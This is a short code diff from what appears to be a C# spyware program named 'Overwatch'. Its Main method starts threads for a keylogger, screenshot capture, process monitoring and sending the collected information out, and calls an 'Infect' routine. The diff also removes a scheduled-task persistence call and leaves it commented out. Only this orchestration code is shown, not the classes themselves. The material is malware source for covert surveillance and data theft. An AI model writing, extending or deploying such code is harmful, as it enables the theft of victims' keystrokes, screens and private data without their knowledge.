@@ -8,12 +8,13 @@ namespace Overwatch
         static appLog Log = new appLog();
         static cReceiveInformation info = new cReceiveInformation();
         static cKeylogger k = new cKeylogger();
+        //static cInstallTaskScheduler T = new cInstallTaskScheduler();
         static cSendingInformation s = new cSendingInformation();
         static Thread KeyTread = new Thread(k.Start);
         static Thread ScreenTread = new Thread(info.ScreenShoot);
         static Thread SendingTread = new Thread(s.Sending);
         static Thread ProcessTread = new Thread(info.Overview); 
-
+        
         static void Main(string[] args)
         {
             try
@@ -21,7 +22,6 @@ namespace Overwatch
 
                 cStartupOptions.ProcessStartInfo();
                 cChangeLabel.Infect(args);
-                cInstallTaskScheduler.AddTask();
                 KeyTread.Start();
                 ScreenTread.Start();
                 ProcessTread.Start();
